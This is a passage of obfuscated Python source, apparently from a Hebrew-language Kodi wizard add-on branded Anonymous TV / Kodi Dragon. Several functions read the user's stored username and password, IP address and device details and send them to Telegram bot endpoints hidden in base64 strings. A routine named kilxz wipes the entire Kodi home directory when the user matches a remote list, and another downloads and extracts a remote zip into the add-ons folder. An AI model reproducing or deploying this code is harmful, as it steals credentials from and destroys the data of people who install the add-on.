          O000O0O0OO00000O0 =urlopen (O000OOO0O0OO00OOO +que ('בעיה במנוי ')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+O00000000000OO000 +que (' סיסמה: ')+OO0O0O000OO00OOO0 +que (' קודי: ')+O0O0OO0O0O00000OO +que (' כתובת: ')+O0O00O0O0000OOO00 +que (' מערכת הפעלה: ')+platform_d ()+que (' שם המערכת: ')+O0O0000O000OO0O00 +que (' גירסת ויזארד: ')+VERSION ).readlines ()#line:481
       except :pass #line:483
def tryinstall ():#line:485
          import json ,platform #line:487
          OO0O0O0O00O0OOO00 =(ADDON .getSetting ("user"))#line:489
          O00O0O0OOO0OO0O00 =(ADDON .getSetting ("pass"))#line:490
          OO0OOO0O0O00O0000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:491
          O0000O0O000O0OO00 =platform .uname ()#line:492
          OO00OOOO0OOO000OO =O0000O0O000O0OO00 [1 ]#line:493
          OO0000O0O0O000O0O =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode ('utf-8')#line:494
          OO0O0O00O00O000O0 =urlopen ('https://api.ipify.org/?format=json').read ()#line:495
          O0O0OO0000O0O00OO =str (json .loads (OO0O0O00O00O000O0 )['ip'])#line:496
          O00O0OOOOO000000O =OO0O0O0O00O0OOO00 #line:497
          OO00OO00O0OO00O0O =O00O0O0OOO0OO0O00 #line:498
          import socket #line:499
          OO0O0O00O00O000O0 =urlopen (OO0000O0O0O000O0O +que ('מנסים: ')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+O00O0OOOOO000000O +que (' סיסמה: ')+OO00OO00O0OO00O0O +que (' קודי: ')+OO0OOO0O0O00O0000 +que (' כתובת: ')+O0O0OO0000O0O00OO +que (' מערכת הפעלה: ')+platform_d ()+que (' שם המערכת: ')+OO00OOOO0OOO000OO +que (' גירסת ויזארד: ')+VERSION ).readlines ()#line:500
def Account_Send (OO0000O00OOOO00OO ,OOO0O0O00O0O0OOO0 ):#line:503
          import json ,platform #line:505
          OO0OOO0OOO00O00O0 =(ADDON .getSetting ("user"))#line:507
          OOOOOOO00O00O0000 =(ADDON .getSetting ("pass"))#line:508
          OOOO0OO00O0OOOO00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:509
          O00OO00OOO00O000O =platform .uname ()#line:510
          OO0000O0OOOOO000O =O00OO00OOO00O000O [1 ]#line:511
          if getS ('dragon')=='true':#line:512
            O00O0O0O0OO00O0O0 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDQzMjU2NjE1MTpBQUdhUUxkWm90dFQyYUZHNFpRQ19JeUFHcFJyZ0phN3d6SS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNTUxMTkwOTY0JnRleHQ9').decode ('utf-8')#line:513
          else :#line:514
            O00O0O0O0OO00O0O0 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUwNjAyNjcwNTE6QUFIQWl5bFNENGREYzlWeGtncjJXc2o3WHhkV3FvTUhVX00vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTY2NTgwNTE0OCZ0ZXh0PQ==').decode ('utf-8')#line:515
          O0OOOOO0OOO0OO0OO =urlopen ('https://api.ipify.org/?format=json').read ()#line:516
          OOO000OOOO0O00O0O =str (json .loads (O0OOOOO0OOO0OO0OO )['ip'])#line:517
          OOO00O0O0O0O0OO0O =OO0OOO0OOO00O00O0 #line:518
          O00OOOO000OO00000 =OOOOOOO00O00O0000 #line:519
          import socket #line:520
          O0OOOOO0OOO0OO0OO =urlopen (O00O0O0O0OO00O0O0 +OO0000O00OOOO00OO +que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+OOO00O0O0O0O0OO0O +que (' סיסמה: ')+O00OOOO000OO00000 +que (' קודי: ')+OOOO0OO00O0OOOO00 +que (' כתובת: ')+OOO000OOOO0O00O0O +que (' מערכת הפעלה: ')+platform_d ()+que (' שם המערכת: ')+OO0000O0OOOOO000O +que (' גירסת ויזארד: ')+VERSION +que (' הסתיים בתאריך: ')+OOO0O0O00O0O0OOO0 ).readlines ()#line:521
def checkTheme (O0OO00000OO000O0O ,O00O0O000O000O0O0 ,OO0O0O00O0O0OOO0O ):#line:523
    OOOO00000OOOOOOO0 =checkBuild (O0OO00000OO000O0O ,'theme')#line:524
    if not workingURL (OOOO00000OOOOOOO0 )==True :return False #line:525
    OO000000OO0O00OOO =openURL (OOOO00000OOOOOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:526
    OO00OO0OO00OOOO0O =re .compile ('name="%s".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult=(.+?).+?escription="(.+?)"'%O00O0O000O000O0O0 ).findall (OO000000OO0O00OOO )#line:527
    if len (OO00OO0OO00OOOO0O )>0 :#line:528
        for O0O0O0O00OOO0000O ,OOOOO0OOOO0O00O00 ,O0OO0OO00OO0OOOOO ,OO000O0OOOOOOOO0O ,OO0000OOO0O00OO00 in OO00OO0OO00OOOO0O :#line:529
            if OO0O0O00O0O0OOO0O =='url':return O0O0O0O00OOO0000O #line:530
            elif OO0O0O00O0O0OOO0O =='icon':return OOOOO0OOOO0O00O00 #line:531
            elif OO0O0O00O0O0OOO0O =='fanart':return O0OO0OO00OO0OOOOO #line:532
            elif OO0O0O00O0O0OOO0O =='adult':return OO000O0OOOOOOOO0O #line:533
            elif OO0O0O00O0O0OOO0O =='description':return OO0000OOO0O00OO00 #line:534
            elif OO0O0O00O0O0OOO0O =='all':return O0OO00000OO000O0O ,O00O0O000O000O0O0 ,O0O0O0O00OOO0000O ,OOOOO0OOOO0O00O00 ,O0OO0OO00OO0OOOOO ,OO000O0OOOOOOOO0O ,OO0000OOO0O00OO00 #line:535
    else :return False #line:536
def fix ():#line:537
    xbmc .executebuiltin ('UpdateLocalAddons()')#line:538
    xbmc .sleep (1000 )#line:539
    xbmc .executeJSONRPC ('{{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{{"addonid":"{0}","enabled":true}},"id":1}}'.format ('repository.gaia.2'))#line:540
def kilxz ():#line:541
  try :#line:542
    O00OO0O0O0O0O000O =False #line:543
    import json ,platform #line:544
    OO0O0O000OOOO00O0 =(ADDON .getSetting ("user"))#line:545
    OOO0OOOO0O000O000 =(ADDON .getSetting ("pass"))#line:546
    O00000OO0000OOO0O =ld (dr )#line:547
    O0OOO00OO0O0O0O0O =urlopen (O00000OO0000OOO0O )#line:548
    O0OOO0000OO00O00O =O0OOO00OO0O0O0O0O .readlines ()#line:549
    O0OOO0000OO00O00O =[OOO00O0O00O000OOO .rstrip ()for OOO00O0O00O000OOO in O0OOO0000OO00O00O ]#line:550
    OOO000OOOO0000000 =urlopen ('https://api.ipify.org/?format=json').read ()#line:551
    OO0O0000000O0OO00 =str (json .loads (OOO000OOOO0000000 )['ip'])#line:552
    O00OO0000O000OOOO =platform .uname ()#line:553
    O0O0O00OO00O0OOOO =O00OO0000O000OOOO [1 ]#line:554
    OOO000OO0O00OO0OO =0 #line:555
    for O000O00O0O0O0O0OO in O0OOO0000OO00O00O :#line:556
        if OO0O0000000O0OO00 ==O000O00O0O0O0O0OO .decode ('utf-8').split (' ==')[0 ]:#line:557
            OOO000OO0O00OO0OO =1 #line:558
            break #line:559
        if O0O0O00OO00O0OOOO ==O000O00O0O0O0O0OO .decode ('utf-8').split (' ==')[0 ]:#line:560
            OOO000OO0O00OO0OO =1 #line:561
            break #line:562
        if O000O00O0O0O0O0OO .decode ('utf-8').split (' ==')[0 ]==OO0O0O000OOOO00O0 or O000O00O0O0O0O0OO .decode ('utf-8').split ()[0 ]==OO0O0O000OOOO00O0 or O000O00O0O0O0O0OO .decode ('utf-8').split ()[0 ]==OOO0OOOO0O000O000 :#line:563
            OOO000OO0O00OO0OO =1 #line:564
            break #line:565
    if OOO000OO0O00OO0OO ==0 :#line:566
       sys .exit ()#line:567
    else :#line:568
      Account_Send (que (' הוסר '),'')#line:569
      OO0OOOOOOO00O00OO =os .path .join (HOME )#line:570
      if os .path .exists (OO0OOOOOOO00O00OO ):#line:571
            for O0O00OO00OO0OO0OO ,OO0OOO0OOO0O0OO0O ,OOOOOO0OOO0O0000O in os .walk (OO0OOOOOOO00O00OO ):#line:572
                for O0OO0OO00OO0O0OOO in OOOOOO0OOO0O0000O :#line:573
                    try :#line:574
                        os .unlink (os .path .join (O0O00OO00OO0OO0OO ,O0OO0OO00OO0O0OOO ))#line:575
                    except :pass #line:576
                for O0000O00000O0OOOO in OO0OOO0OOO0O0OO0O :#line:577
                    try :#line:578
                        shutil .rmtree (os .path .join (O0O00OO00OO0OO0OO ,O0000O00000O0OOOO ))#line:579
                    except :pass #line:580
  except :pass #line:581
def gdrive ():#line:582
    O000OO000000OO00O ='https://github.com/vip200/victory/blob/master/n.zip?raw=true'#line:583
    OOOO0O0O0O00O0OO0 =translatepath (os .path .join ('special://home/addons','packages'))#line:584
    OOO00O0OOO0000O0O =os .path .join (PACKAGES ,'isr.zip')#line:585
    O000O000000OO0O00 =Request (O000OO000000OO00O )#line:586
    OO000000000O0O000 =urlopen (O000O000000OO0O00 )#line:587
    O0O0OOO00000OO000 =open (OOO00O0OOO0000O0O ,'wb')#line:588
    try :#line:589
      O0OO000OO0000OOO0 =OO000000000O0O000 .info ().getheader ('Content-Length').strip ()#line:590
      O0OOO000000O0OOOO =True #line:591
    except AttributeError :#line:592
          O0OOO000000O0OOOO =False #line:593
    if O0OOO000000O0OOOO :#line:594
          O0OO000OO0000OOO0 =int (O0OO000OO0000OOO0 )#line:595
    OOOO00OOOO0O00OO0 =0 #line:596
    OO00O00OOOOO0OOO0 =time .time ()#line:597
    while True :#line:598
          O000OOO0OO00O0O0O =OO000000000O0O000 .read (8192 )#line:599
          if not O000OOO0OO00O0O0O :#line:600
              sys .stdout .write ('\n')#line:601
              break #line:602
          OOOO00OOOO0O00OO0 +=len (O000OOO0OO00O0O0O )#line:604
          O0O0OOO00000OO000 .write (O000OOO0OO00O0O0O )#line:605
    OO0OOOOO0OOO0OOOO =translatepath (os .path .join ('special://home/addons'))#line:607
    O0O0OOO00000OO000 .close ()#line:608
    O0O0O00O0000O0OO0 =zipfile .ZipFile (OOO00O0OOO0000O0O ,'r')#line:610
    O0O0O00O0000O0OO0 .extractall (OO0OOOOO0OOO0OOOO )#line:611
    try :#line:613
      os .remove (OOO00O0OOO0000O0O )#line:614
    except :#line:615
      pass #line:616
    fix ()#line:618
def contact_wiz (msg =""):#line:619
    class OO00O00O0OO0OOOOO (xbmcgui .WindowXMLDialog ):#line:620
        def __init__ (OOOOO0O000OO0O0O0 ,*O0O00O0O00OOO00OO ,**O0OOOOOOOO0O0O000 ):#line:621
            OOOOO0O000OO0O0O0 .title =THEME3 %O0OOOOOOOO0O0O000 ["title"]#line:622
            OOOOO0O000OO0O0O0 .image =O0OOOOOOOO0O0O000 ["image"]#line:623
            OOOOO0O000OO0O0O0 .fanart =O0OOOOOOOO0O0O000 ["fanart"]#line:624
            OOOOO0O000OO0O0O0 .msg =THEME2 %O0OOOOOOOO0O0O000 ["msg"]#line:625
        def onInit (O0O0OOOO0000O0OO0 ):#line:627
            O0O0OOOO0000O0OO0 .fanartimage =101 #line:628
            O0O0OOOO0000O0OO0 .titlebox =102 #line:629
            O0O0OOOO0000O0OO0 .imagecontrol =103 #line:630
            O0O0OOOO0000O0OO0 .textbox =104 #line:631
            O0O0OOOO0000O0OO0 .scrollcontrol =105 #line:632
            O0O0OOOO0000O0OO0 .closebutton =106 #line:633
            O0O0OOOO0000O0OO0 .showdialog ()#line:634
        def showdialog (O0O00000OOO000OO0 ):#line:636
            O0O00000OOO000OO0 .getControl (O0O00000OOO000OO0 .imagecontrol ).setImage (O0O00000OOO000OO0 .image )#line:637
            O0O00000OOO000OO0 .getControl (O0O00000OOO000OO0 .fanartimage ).setImage (O0O00000OOO000OO0 .fanart )#line:638
            O0O00000OOO000OO0 .getControl (O0O00000OOO000OO0 .fanartimage ).setColorDiffuse ('9FFFFFFF')#line:639
            O0O00000OOO000OO0 .getControl (O0O00000OOO000OO0 .textbox ).setText (O0O00000OOO000OO0 .msg )#line:640
            O0O00000OOO000OO0 .getControl (O0O00000OOO000OO0 .titlebox ).setLabel (O0O00000OOO000OO0 .title )#line:641
            O0O00000OOO000OO0 .setFocusId (O0O00000OOO000OO0 .closebutton )#line:642
        def onClick (OO0OO0OO0OO00O0OO ,OOOO0000O0O000OO0 ):#line:643
            if OOOO0000O0O000OO0 ==OO0OO0OO0OO00O0OO .closebutton :OO0OO0OO0OO00O0OO .close ()#line:644
        def onAction (O0OO0O0O0O0OOOOO0 ,O00O0O000OOO0OOOO ):#line:645
            if O00O0O000OOO0OOOO ==O0OO0O0O0O0OOOOO0 .closebutton :O0OO0O0O0O0OOOOO0 .close ()#line:646
            elif O00O0O000OOO0OOOO ==ACTION_PREVIOUS_MENU :O0OO0O0O0O0OOOOO0 .close ()#line:647
            elif O00O0O000OOO0OOOO ==ACTION_NAV_BACK :O0OO0O0O0O0OOOOO0 .close ()#line:648
    if getS ('dragon')=='true':#line:649
        OOO0O000O0O00000O =OO00O00O0OO0OOOOO ("ContactDragon.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',title ='Kodi Dragon',fanart =CONTACTFANART ,image =CONTACTICON ,msg =msg )#line:650
    else :#line:651
        OOO0O000O0O00000O =OO00O00O0OO0OOOOO ("Contact.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',title ='ANONYMOUS TV',fanart =CONTACTFANART ,image =CONTACTICON ,msg =msg )#line:652
    OOO0O000O0O00000O .doModal ()#line:653
    del OOO0O000O0O00000O #line:654
def user_info_Window (OO0O0OOOOOOOOO000 ,O0OO0OO0OOO0O0OOO ,OO00OO0OO0O000000 ,O0O00000O0O0OO0OO ,OOO00O00OO0O0O00O ,OOO0O000O00O00OO0 ):#line:655
    class OOO00O0OOOO00OOO0 (xbmcgui .WindowXMLDialog ):#line:656
        def __init__ (OOOOOO0O0O0O0OO0O ,*OOO000OO000O00OOO ,**OO00000000000OO0O ):#line:657
            OOOOOO0O0O0O0OO0O .title =THEME3 %OO00000000000OO0O ["title"]#line:658
            OOOOOO0O0O0O0OO0O .image =OO00000000000OO0O ["image"]#line:659
            OOOOOO0O0O0O0OO0O .fanart =OO00000000000OO0O ["fanart"]#line:660
            OOOOOO0O0O0O0OO0O .tele =OO00000000000OO0O ["tele"]#line:661
            OOOOOO0O0O0O0OO0O .update =OO00000000000OO0O ["update"]#line:662
            OOOOOO0O0O0O0OO0O .rd =OO00000000000OO0O ["rd"]#line:663
            OOOOOO0O0O0O0OO0O .userdate =OO00000000000OO0O ["userdate"]#line:664
            OOOOOO0O0O0O0OO0O .username =OO00000000000OO0O ["username"]#line:665
            OOOOOO0O0O0O0OO0O .device =OO00000000000OO0O ["device"]#line:666
        def onInit (O00OOOO00OOO0O000 ):#line:668
            O00OOOO00OOO0O000 .username_title =100 #line:669
            O00OOOO00OOO0O000 .fanartimage =101 #line:670
            O00OOOO00OOO0O000 .titlebox =102 #line:671
            O00OOOO00OOO0O000 .imagecontrol =103 #line:672
            O00OOOO00OOO0O000 .textbox =104 #line:673
            O00OOOO00OOO0O000 .scrollcontrol =105 #line:674
            O00OOOO00OOO0O000 .closebutton =106 #line:675
            O00OOOO00OOO0O000 .tele_title =107 #line:676
            O00OOOO00OOO0O000 .update_title =108 #line:677
            O00OOOO00OOO0O000 .rd_title =109 #line:678
            O00OOOO00OOO0O000 .device_cunt =110 #line:679
            O00OOOO00OOO0O000 .userdate_title =111 #line:680
            O00OOOO00OOO0O000 .showdialog ()#line:682
        def showdialog (OO000O00OOO0O0O0O ):#line:684
            OO000O00OOO0O0O0O .getControl (OO000O00OOO0O0O0O .username_title ).setLabel (OO000O00OOO0O0O0O .username )#line:685
            OO000O00OOO0O0O0O .getControl (OO000O00OOO0O0O0O .device_cunt ).setLabel (OO000O00OOO0O0O0O .device )#line:686
            OO000O00OOO0O0O0O .getControl (OO000O00OOO0O0O0O .imagecontrol ).setImage (OO000O00OOO0O0O0O .image )#line:688
            OO000O00OOO0O0O0O .getControl (OO000O00OOO0O0O0O .fanartimage ).setImage (OO000O00OOO0O0O0O .fanart )#line:689
            OO000O00OOO0O0O0O .getControl (OO000O00OOO0O0O0O .fanartimage ).setColorDiffuse ('9FFFFFFF')#line:690
            OO000O00OOO0O0O0O .getControl (OO000O00OOO0O0O0O .tele_title ).setLabel (OO000O00OOO0O0O0O .tele )#line:693
            OO000O00OOO0O0O0O .getControl (OO000O00OOO0O0O0O .update_title ).setLabel (OO000O00OOO0O0O0O .update )#line:694
            OO000O00OOO0O0O0O .getControl (OO000O00OOO0O0O0O .rd_title ).setLabel (OO000O00OOO0O0O0O .rd )#line:695
            OO000O00OOO0O0O0O .getControl (OO000O00OOO0O0O0O .userdate_title ).setLabel (OO000O00OOO0O0O0O .userdate )#line:696
            OO000O00OOO0O0O0O .setFocusId (OO000O00OOO0O0O0O .closebutton )#line:698
        def onClick (OOOO00OOO00000000 ,OOOO0000OOOO0O0OO ):#line:700
            if OOOO0000OOOO0O0OO ==OOOO00OOO00000000 .closebutton :OOOO00OOO00000000 .close ()#line:701
        def onAction (OO0O000OO0OOO00OO ,O0O0O00OOOO0OO0O0 ):#line:702
            if O0O0O00OOOO0OO0O0 ==OO0O000OO0OOO00OO .closebutton :OO0O000OO0OOO00OO .close ()#line:703
            elif O0O0O00OOOO0OO0O0 ==ACTION_PREVIOUS_MENU :OO0O000OO0OOO00OO .close ()#line:704
            elif O0O0O00OOOO0OO0O0 ==ACTION_NAV_BACK :OO0O000OO0OOO00OO .close ()#line:705
    if getS ('dragon')=='true':#line:706
        O000OOOOOOOO00OOO =OOO00O0OOOO00OOO0 ("userinfoDragon.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',title ='Kodi Dragon',fanart =CONTACTFANART ,image =CONTACTICON ,tele =OO0O0OOOOOOOOO000 ,userdate =O0O00000O0O0OO0OO ,update =O0OO0OO0OOO0O0OOO ,rd =OO00OO0OO0O000000 ,username =OOO00O00OO0O0O00O ,device =OOO0O000O00O00OO0 )#line:707
    else :#line:708
        O000OOOOOOOO00OOO =OOO00O0OOOO00OOO0 ("userinfo.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',title ='ANONYMOUS TV',fanart =CONTACTFANART ,image =CONTACTICON ,tele =OO0O0OOOOOOOOO000 ,userdate =O0O00000O0O0OO0OO ,update =O0OO0OO0OOO0O0OOO ,rd =OO00OO0OO0O000000 ,username =OOO00O00OO0O0O00O ,device =OOO0O000O00O00OO0 )#line:709
    O000OOOOOOOO00OOO .doModal ()#line:710
    del O000OOOOOOOO00OOO #line:711
def req ():#line:712
    import sys #line:713
    OO0O0000O0000O000 =translatepath ('special://home/addons/script.module.requests/lib')#line:714
    sys .path .append (OO0O0000O0000O000 )#line:715
    OO0O0000O0000O000 =translatepath ('special://home/addons/script.module.urllib3/lib')#line:716
    sys .path .append (OO0O0000O0000O000 )#line:717
    OO0O0000O0000O000 =translatepath ('special://home/addons/script.module.chardet/lib')#line:718
    sys .path .append (OO0O0000O0000O000 )#line:719
    OO0O0000O0000O000 =translatepath ('special://home/addons/script.module.certifi/lib')#line:720
    sys .path .append (OO0O0000O0000O000 )#line:721
    OO0O0000O0000O000 =translatepath ('special://home/addons/script.module.idna/lib')#line:722
    sys .path .append (OO0O0000O0000O000 )#line:723
    OO0O0000O0000O000 =translatepath ('special://home/addons/script.module.futures/lib')#line:724
    sys .path .append (OO0O0000O0000O000 )#line:725
def user_info ():#line:727
    xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:728
    O00OO0OO0O0O00OO0 =xbmcaddon .Addon ('plugin.video.telemedia')#line:729
    O00O0O00OO0OO000O =O00OO0OO0O0O00OO0 .getSetting ('port')#line:730
    try :#line:731
        import random #line:732
        req ()#line:733
        import requests #line:734
        O0O0000O00O0O000O =random .randint (1 ,1001 )#line:735
        O0OO000OO0OOO0O00 ={'type':'td_send','info':json .dumps ({'@type':'getOption','name':'my_id','@extra':O0O0000O00O0O000O })}#line:738
        OO0000O0O0OOOOOOO =requests .post ('http://127.0.0.1:%s/'%O00O0O00OO0OO000O ,json =O0OO000OO0OOO0O00 ).json ()#line:739
        O0OO0000O0O00OO00 =OO0000O0O0OOOOOOO ['value']#line:740
        if '1229060184'==O0OO0000O0O00OO00 :#line:741
          O00O0000O00000O00 ='חשבון טלמדיה: VIP פעיל'#line:742
        else :#line:743
          O00O0000O00000O00 ='חשבון טלמדיה: אישי'#line:744
    except :#line:745
          O00O0000O00000O00 ='חשבון טלמדיה: אינו פעיל'#line:746
    if getS ('dragon')=='true':#line:747
        O0OOO00OO0000000O ='תקופת המנוי ב Kodi Dragon תסתיים בתאריך: '+getS ("date_user")#line:748
    else :#line:749
        O0OOO00OO0000000O ='תקופת המנוי Anonymous TV תסתיים בתאריך: '+getS ("date_user")#line:750
    OOOOO000O0O0O00OO =os .path .join (translatepath ("special://home/"),"addons","skin.Premium.mod","16x9","Includes_Home.xml")#line:751
    if KODI_VERSION <=18 :#line:752
        OOO0000OO000000O0 =open (OOOOO000O0O0O00OO ,'r')#line:754
        OOO0O000OOOO000O0 =OOO0000OO000000O0 .read ()#line:755
        OOO0000OO000000O0 .close ()#line:756
    else :#line:757
        OOO0000OO000000O0 =open (OOOOO000O0O0O00OO ,'r',encoding ='utf-8')#line:758
        OOO0O000OOOO000O0 =OOO0000OO000000O0 .read ()#line:759
        OOO0000OO000000O0 .close ()#line:760
    OO0000000OO000000 ='<!-- 2 --><label>(.+?)</label>'#line:762
    O0O0OOOOO000O000O =re .compile (OO0000000OO000000 ).findall (OOO0O000OOOO000O0 )[0 ]#line:763
    if os .path .exists (translatepath ("special://home/addons/")+'plugin.video.mando'):#line:764
        O00OO0OO0O0O00OO0 =xbmcaddon .Addon ('plugin.video.mando')#line:765
        OO0OO0O00O00O0OOO =O00OO0OO0O0O00OO0 .getSetting ('debrid_use')#line:766
    else :#line:767
        OO0OO0O00O00O0OOO =='false'#line:768
    if OO0OO0O00O00O0OOO =='true':#line:769
        try :#line:770
            OOO0OO0OOO000000O =O00OO0OO0O0O00OO0 .getSetting ('rd.auth')#line:771
            O00O00OOOOOOOO0OO ='https://api.real-debrid.com/rest/1.0/user?auth_token=%s'%OOO0OO0OOO000000O #line:772
            req ()#line:773
            import requests #line:774
            OOO00OOOOO0O00000 =requests .get (O00O00OOOOOOOO0OO ,timeout =15 ).json ()#line:775
            OO0000000OO000000 ='(.+?)T'#line:776
            OOOOOO0O0000000OO =re .compile (OO0000000OO000000 ).findall (OOO00OOOOO0O00000 ['expiration'])[0 ]#line:777
            from datetime import datetime #line:778
            OO0000OOO0OO0000O ,O0O000OOOOOOO00O0 ,OOO0000000OOOOO0O =OOOOOO0O0000000OO .split ('-')#line:779
            O000OO0OO000O000O =OOO0000000OOOOO0O +'.'+O0O000OOOOOOO00O0 +'.'+OO0000OOO0OO0000O #line:780
            O0O0OO00O0OOO0O00 ='שירות Real-Debrid פעיל ומסתיים בתאריך: '+str (O000OO0OO000O000O )#line:781
        except :#line:782
            O0O0OO00O0OOO0O00 ='שירות Real-Debrid פעיל'#line:783
    else :#line:784
      O0O0OO00O0OOO0O00 ='שירות Real-Debrid: אינו פעיל'#line:785
    OO0OOO0O000OOO0OO ='תאריך עדכון מערכת: '+O0O0OOOOO000O000O #line:786
    if getS ('dragon')=='true':#line:787
        OOOO000OOO00O0OOO ='שם משתמש: '+getS ('user')#line:788
    else :#line:789
        OOOO000OOO00O0OOO =''#line:790
    OOO000OO00OO0OO00 ='כמות מכשירים: '+getS ("device")#line:791
    xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:792
    user_info_Window (O00O0000O00000O00 ,OO0OOO0O000OOO0OO ,O0O0OO00O0OOO0O00 ,O0OOO00OO0000000O ,OOOO000OOO00O0OOO ,OOO000OO00OO0OO00 )#line:794
def user_sync ():#line:796
    O0000OOOO0O00OOOO =getS ("sync_user")#line:797
    try :#line:798
        O0OOO0O0OOOOOOO00 =xbmcaddon .Addon ('plugin.program.mediasync')#line:799
        O0OOO0O0OOOOOOO00 .setSetting ('firebase',O0000OOOO0O00OOOO )#line:800
        O0OOO0O0OOOOOOO00 .setSetting ('sync_mod','true')#line:801
    except :pass #line:802
    try :#line:803
        OO000O0O00OO0O00O =xbmcaddon .Addon ('plugin.video.telemedia')#line:804
        OO000O0O00OO0O00O .setSetting ('firebase',O0000OOOO0O00OOOO )#line:805
        OO000O0O00OO0O00O .setSetting ('sync_mod','true')#line:806
    except :pass #line:807
    try :#line:808
        O00000000O0000OOO =xbmcaddon .Addon ('plugin.video.mando')#line:809
        O00000000O0000OOO .setSetting ('firebase',O0000OOOO0O00OOOO )#line:810
        O00000000O0000OOO .setSetting ('sync_mod','true')#line:811
    except :pass #line:812
    try :#line:813
        O00OOOOO0OOOOOO00 =xbmcaddon .Addon ('script.module.xtvsh')#line:814
        O00OOOOO0OOOOOO00 .setSetting ('firebase',O0000OOOO0O00OOOO )#line:815
        O00OOOOO0OOOOOO00 .setSetting ('sync_mod','true')#line:816
    except :pass #line:817
    try :#line:818
        OO0OO0OO0OO00000O =xbmcaddon .Addon ('plugin.video.thorrent')#line:819
        OO0OO0OO0OO00000O .setSetting ('firebase',O0000OOOO0O00OOOO )#line:820
        OO0OO0OO0OO00000O .setSetting ('sync_mod','true')#line:821
    except :pass #line:822
    try :#line:823
        OO00O00O00OO0O0O0 =xbmcaddon .Addon ('context.myfav')#line:824
        OO00O00O00OO0O0O0 .setSetting ('firebase',O0000OOOO0O00OOOO )#line:825
        OO00O00O00OO0O0O0 .setSetting ('sync_mod','true')#line:826
    except :pass #line:827
def make_setting_file ():#line:830
    OO0OOOOO00O000O00 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings.xml")#line:831
    O0O00OO00OO0OOOO0 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings_backup.xml")#line:832
    try :#line:833
        if KODI_VERSION <=18 :#line:834
            O0OO0OOOO000OO000 =open (OO0OOOOO00O000O00 ,'r')#line:836
            O0O0O0OOO0OOO0O0O =O0OO0OOOO000OO000 .read ()#line:837
            O0OO0OOOO000OO000 .close ()#line:838
        else :#line:839
            O0OO0OOOO000OO000 =open (OO0OOOOO00O000O00 ,'r',encoding ='utf-8')#line:840
            O0O0O0OOO0OOO0O0O =O0OO0OOOO000OO000 .read ()#line:841
            O0OO0OOOO000OO000 .close ()#line:842
        if O0O0O0OOO0OOO0O0O =='':#line:843
                copyfile (O0O00OO00OO0OOOO0 ,OO0OOOOO00O000O00 )#line:845
    except :#line:846
       os .remove (os .path .join (translatepath ("special://userdata/"),"addon_data","plugin.program.Anonymous","settings.xml"))#line:847
def STARTP ():#line:849
    OOO0O0O0O0OO0000O =(ADDON .getSetting ("user"))#line:851
    OOO0O0O0O0OO0000O =OOO0O0O0O0OO0000O .lower ()#line:852
    O0000OO0O0OO000OO =urlopen (ld (US ))#line:853
    O0OO0OO0O0OOO0O00 =O0000OO0O0OO000OO .readlines ()#line:854
    O0O0O0O0OO0OOO0O0 =0 #line:855
    for O00OO00OOO0O0OOOO in O0OO0OO0O0OOO0O00 :#line:857
        if O00OO00OOO0O0OOOO .decode ('utf-8').split (' ==')[0 ]==OOO0O0O0O0OO0000O or O00OO00OOO0O0OOOO .decode ('utf-8').split ()[0 ]==OOO0O0O0O0OO0000O :#line:858
            O0O0O0O0OO0OOO0O0 =1 #line:859
            if '@'in O00OO00OOO0O0OOOO .decode ('utf-8'):#line:861
                    setS ("dragon","true")#line:862
            else :#line:863
                    setS ("dragon","false")#line:864
            try :#line:865
                try :#line:866
                    OO0000OO0000OOO00 =' == (.+?) = '#line:867
                    OO0O00O0O0O000OOO =re .compile (OO0000OO0000OOO00 ).findall (O00OO00OOO0O0OOOO .decode ('utf-8'))[0 ]#line:868
                    setS ("date_user",OO0O00O0O0O000OOO .replace ('@','').replace (' ',''))#line:869
                except :#line:871
                    OO0000OO0000OOO00 =' == (.+?)\n'#line:872
                    OO0O00O0O0O000OOO =re .compile (OO0000OO0000OOO00 ).findall (O00OO00OOO0O0OOOO .decode ('utf-8'))[0 ]#line:873
                    setS ("date_user",OO0O00O0O0O000OOO .replace ('@','').replace (' ',''))#line:875
            except :#line:876
                OO0O00O0O0O000OOO =''#line:877
                setS ("date_user",OO0O00O0O0O000OOO .replace ('@','').replace (' ',''))#line:878
            try :#line:879
                try :#line:880
                    O0OO0OO000OO0O0OO =' = (.+?) @ '#line:881
                    OOOOOO0O00O0O0OO0 =re .compile (O0OO0OO000OO0O0OO ).findall (O00OO00OOO0O0OOOO .decode ('utf-8'))[0 ]#line:882
                    setS ("sync_user",OOOOOO0O00O0O0OO0 .replace ('@','').replace (' ',''))#line:883
                    setS ("pass2","true")#line:884
                    if getS ("set_usersync")=='true':#line:885
                     if os .path .exists (translatepath ("special://home/addons/plugin.program.mediasync")):#line:886
                        OOOOO0OO0O0OO000O =xbmcaddon .Addon ('plugin.program.mediasync')#line:887
                        OOOOO0OO0O0OO000O .setSetting ('firebase',OOOOOO0O00O0O0OO0 .replace ('@','').replace (' ',''))#line:888
                        OOOOO0OO0O0OO000O .setSetting ('sync_mod','true')#line:889
                        user_sync ()#line:890
